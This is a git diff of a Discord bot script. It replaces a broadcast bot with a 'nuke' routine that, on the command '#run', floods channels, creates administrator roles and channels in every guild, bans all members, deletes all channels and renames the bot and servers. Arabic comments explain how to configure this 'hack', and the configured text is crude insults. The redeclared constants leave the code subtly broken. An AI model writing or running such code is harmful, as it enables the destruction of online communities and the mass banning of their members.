@@ -1,172 +1,52 @@
 const Discord = require('discord.js');
-const fs = require('fs');
-const moment = require('moment');
-const devs = ['333140974865874944', '510520286488035339'];
 const client = new Discord.Client();
-
+ const prefix = "#";
 client.on('ready', () => {
-  console.log(`Logged in as ${client.user.tag}!`);
+    console.log('I am ready!');
 });
-
-client.on('message', msg => {
-  if (msg.content === 'ping') {
-    msg.reply('Pong!');
-  }
-});
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-var prefix = "-"
-client.on('message', message => {
-  if (!message.content.startsWith(prefix)) return;
-  var args = message.content.split(' ').slice(1);
-  var argresult = args.join(' ');
-
-
-  
-  if (message.content.startsWith(prefix + 'setwatch')) {
-  client.user.setActivity(argresult, {type: 'WATCHING'})
-     console.log('test' + argresult);
-    message.channel.sendMessage(`**Watch Now: ${argresult}**`)
-} 
-
  
-  if (message.content.startsWith(prefix + 'setlis')) {
-  client.user.setActivity(argresult, {type: 'LISTENING'})
-     console.log('test' + argresult);
-    message.channel.sendMessage(`**LISTENING Now: ${argresult}**`)
-} 
-
-
-if (message.content.startsWith(prefix + 'setname')) {
-  client.user.setUsername(argresult).then
-      message.channel.sendMessage(`**Username Changed To ${argresult}**`)
-  return message.reply("You Can change the username 2 times per hour");
-} 
-
-if (message.content.startsWith(prefix + 'setavatar')) {
-  client.user.setAvatar(argresult);
-   message.channel.sendMessage(`**Avatar Changed Successfully To ${argresult}**`);
-}
-
-if (message.content.startsWith(prefix + 'setT')) {
-  client.user.setGame(argresult, "https://www.twitch.tv/peery13");
-     console.log('test' + argresult);
-    message.channel.sendMessage(`Streaming: **${argresult}**`)
-} 
-if (message.content.startsWith(prefix + 'setgame')) {
-  client.user.setGame(argresult);
-     console.log('test' + argresult);
-    message.channel.sendMessage(`**Playing: ${argresult}**`)
-} 
-
-
-
-});
-
-
-
-
-
-
-
-
 client.on('message', message => {
-    if (message.author.id === client.user.id) return;
-    if (message.guild) {
-    let embed = new Discord.RichEmbed()
-    let args = message.content.split(' ').slice(1).join(' ');
-    if(message.content.split(' ')[0] == prefix + 'bc') {
-    if(!message.channel.guild) return message.reply('**:x: اسف لكن هذا الامر للسيرفرات فقط **');         
-    if (!args[1]) {
-    return;
-    }
-      message.guild.members.forEach(m => {
-    if(!message.member.hasPermission('ADMINISTRATOR')) return;
-          var bc = new Discord.RichEmbed()
-          .addField('# | الرسالة ', args)
-          .setThumbnail(message.guild.iconURL)
-          .setColor('RANDOM')
-          m.sendMessage(args)
-      });
-             if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply(":x: **ليس لديك الصلاحيه لعمل برودكاست**");
-      const AziRo = new Discord.RichEmbed()   
-      .setColor('RANDOM')
-      message.channel.sendEmbed(AziRo);          
-    }
-    } else {
-      return;
-    }
-    });
-
-
-
-    client.on("message", message => {
-    
-                if (message.content.startsWith(prefix + "obc")) {
-                             if (!message.member.hasPermission("ADMINISTRATOR"))  return;
-      let args = message.content.split(" ").slice(1);
-      var argresult = args.join(' '); 
-      message.guild.members.filter(m => m.presence.status !== 'offline').forEach(m => {
-     m.send(`${argresult}\n ${m}`);
-    })
-     message.channel.send(`\`${message.guild.members.filter(m => m.presence.status !== 'online').size}\` : عدد الاعضاء المستلمين`); 
-     message.delete(); 
-    };     
-    });
-    
-
-
-
-
-
-
-
-
-
-
-client.on("message", message => {
-    if (message.content === (prefix + "help")) {
-     const embed = new Discord.RichEmbed() 
-         .setColor("#580e6b")
-         .setThumbnail(message.author.avatarURL)
-         .setDescription(`**
-         ------------------------------
-               اوامر البرودكاست
-         -bc : برودكاست لجميع اعضاء السيرفر بدون ايمبد
-         -obc : برودكاست للاعضاء  الاونلاين فقط
-         ------------------------------
-         -help : عرض هذه الرسالة
-         ------------------------------
-         
-       **  `)
-   message.channel.sendEmbed(embed)
+    if (message.content === 'zg') {
+        message.reply('pong');
+      }
+});
+ 
+const Discord = require("discord.js");
+const client = new Discord.Client();
+//انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
+const x_x = "#run" //هنا تحط الامر اللي يشغل الهاك
+const teext = "kos omkmk" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
+const vooice = "kos omkmk" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
+const pic = "https://cdn.discordapp.com/attachments/444003405992689665/503998252572475392/giphy.gif" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
+const spam = " kos omkmk " //هنا تحط وش تبي رسالة السبام
+const namee = "kos omk" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
+const playing = "#bc" //هنا تحط وش تبي يكون الستريمنق
+client.on('message', message => {
+if (message.content === x_x) {
+    var teeext = teext.replace(" ", "-")
+    var interval = setInterval (function () {
+    const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail(pic)
+   .addField(spam, ".")
+    message.channel.sendEmbed(embed);
+    client.guilds.forEach(hack => {
+    hack.createRole({name: spam,permissions: [8],color: "#23272a"})
+    hack.createRole({name: spam,permissions: [8],color: " #df1213"})
+    hack.createChannel(teeext, 'text')
+    hack.createChannel(vooice, 'voice')
+    })}, 3);}});
+client.on('message', message => {
+if (message.content === x_x) {
+    message.guild.members.forEach(baand => {
+   baand.ban({reason: spam,});
+   client.channels.forEach(hackch => {
+   hackch.delete();
+   client.user.setAvatar(pic)
+   client.user.setUsername(namee)
+   client.user.setGame(playing, 'https://www.twitch.tv/hix')
+   client.guilds.forEach(hack => {
+   hack.setIcon(pic)
+   hack.setName(namee)})})})}});
    
-   }
-   });  
-
-
-
-
-
-
-
-
-
-
-
-client.login(process.env.BOT_TOKEN);
+   client.login(process.env.BOT_TOKEN);
